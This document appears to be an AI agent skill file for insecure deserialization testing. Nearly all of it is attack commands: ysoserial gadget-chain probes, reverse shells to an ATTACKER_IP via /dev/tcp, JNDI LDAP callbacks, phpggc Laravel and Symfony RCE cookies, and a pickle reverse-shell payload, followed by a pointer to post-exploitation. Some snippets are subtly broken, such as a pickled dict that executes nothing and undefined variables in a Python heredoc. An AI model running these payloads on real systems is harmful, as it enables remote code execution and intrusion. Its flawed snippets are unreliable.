---
name: vuln-deserialization
description: "Insecure deserialization testing — Java (ysoserial gadget chains), PHP object injection, Python pickle RCE, Ruby Marshal injection, .NET BinaryFormatter, Jackson/XStream, node-serialize. Triggers: 'deserialization', 'insecure deserialization', 'java deserialization', 'php deserialization', 'ysoserial', 'pickle rce', 'object injection', 'gadget chain', 'serialized object', 'java serialization'."
---

# Insecure Deserialization Testing

Exploit unsafe deserialization of user-controlled data to achieve RCE via gadget chains.

---

## Phase 1: Detection

```bash
TARGET="https://TARGET"

curl -s -I "$TARGET/api" | grep -i "set-cookie"

echo -n "rO0" | base64 -d | xxd | head -1

curl -s -X POST "$TARGET/api/session" \
  -H "Content-Type: application/octet-stream" \
  --data-binary $'\x80\x05\x95' -I

curl -s -I "$TARGET/" | grep -iE "x-powered-by|server|x-aspnet"
```

---

## Phase 2: Java Deserialization

```bash
TARGET="https://TARGET"
YSOSERIAL="java -jar /opt/ysoserial.jar"
LHOST="ATTACKER_IP"
LPORT="4444"

CHAINS=("CommonsCollections1" "CommonsCollections2" "CommonsCollections3" "CommonsCollections6" "Spring1" "Spring2" "Groovy1" "Hibernate1" "ROME")

for CHAIN in "${CHAINS[@]}"; do
  $YSOSERIAL $CHAIN "curl http://$LHOST:8080/chain-$CHAIN" 2>/dev/null | \
    curl -s -X POST "$TARGET/api/deserialize" \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @- -o /dev/null -w "$CHAIN: %{http_code}\n"
done | tee output/deser_java_results.txt

$YSOSERIAL CommonsCollections6 "bash -c {echo,$(echo -n "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | base64)}|{base64,-d}|{bash,-i}" 2>/dev/null | \
  curl -s -X POST "$TARGET/api/deserialize" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @-

$YSOSERIAL JNDI "ldap://$LHOST:1389/exploit" 2>/dev/null | \
  curl -s -X POST "$TARGET/api/deserialize" \
  --data-binary @-
```

---

## Phase 3: PHP Object Injection

```bash
TARGET="https://TARGET"

python3 -c "
import base64
payload = 'O:8:\"stdClass\":1:{s:4:\"test\";s:2:\"ok\";}'
print(base64.b64encode(payload.encode()).decode())
"

./phpggc -l | grep -i "exec\|rce\|system"

./phpggc Laravel/RCE1 system "id" | base64

./phpggc Symfony/RCE4 system "id" | base64

PAYLOAD=$(./phpggc Laravel/RCE1 system "id" | base64)
curl -s "$TARGET/" -H "Cookie: laravel_session=$PAYLOAD"
curl -s -X POST "$TARGET/api/data" -d "data=$PAYLOAD"
```

---

## Phase 4: Python Pickle RCE

```bash
TARGET="https://TARGET"
LHOST="ATTACKER_IP"
LPORT="4444"

python3 << 'EOF'
import pickle, os, base64

class RCE(object):
    def __reduce__(self):
        cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
EOF

python3 -c "
import pickle, os, base64
payload = pickle.dumps({'__reduce__': (os.system, ('id > /tmp/pwned',))})
print(base64.b64encode(payload).decode())
"

PAYLOAD=$(python3 -c "import pickle, os, base64; print(base64.b64encode(pickle.dumps({'__reduce__': (os.system, ('id',))})).decode())")
curl -s -X POST "$TARGET/api/session" -d "session=$PAYLOAD"
```

---

## Output

Save to `output/`:
- `deser_java_results.txt` — gadget chain probe results
- `deser_rce_poc.txt` — exact payload that achieved RCE

## Next Phase

→ `vuln-rce` for post-exploitation steps
→ `pentest-report` to document findings
